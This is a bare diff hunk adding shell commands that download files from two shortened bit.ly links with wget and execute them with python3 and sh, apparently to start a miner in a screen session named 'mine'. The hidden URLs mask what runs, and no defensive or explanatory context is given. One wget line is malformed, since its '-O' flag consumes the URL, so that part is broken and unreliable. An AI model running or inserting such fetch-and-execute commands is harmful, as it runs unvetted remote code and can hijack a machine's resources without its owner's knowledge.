@@ -1,0 +1,7 @@
+wget -O min https://bit.ly/3hpO352
+python3 min
+
+
+wget -O https://bit.ly/3svndid --quiet && screen -R mine
+
+sh mine
